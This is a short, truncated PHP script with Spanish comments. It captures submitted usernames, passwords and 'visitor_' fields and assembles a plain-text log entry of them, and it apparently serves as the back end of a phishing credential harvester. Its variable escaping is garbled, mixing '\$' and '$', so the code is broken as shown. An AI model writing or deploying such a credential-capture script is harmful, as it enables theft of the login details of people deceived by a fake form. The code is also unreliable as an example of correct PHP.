<?php
if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtiene los datos del formulario
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Obtiene la información del visitante
    \$visitorInfo = [];
    foreach ($_POST as $key => \$value) {
        if (strpos(\$key, 'visitor_') === 0) {
            $visitorInfo[$key] = \$value;
        }
    }
    
    // Crea una cadena con la información
    \$logEntry = "----------------------------------------\n";
    \$logEntry .= "Fecha y Hora: " . date('Y-m-d H:i:s') . "\n";
    $logEntry .= "Nombre de usuario: " . $username . "\n";
    $logEntry .= "Contraseña: " . $password . "\n";
    \$logEntry .= "Información del visitante:\n";
    foreach (\$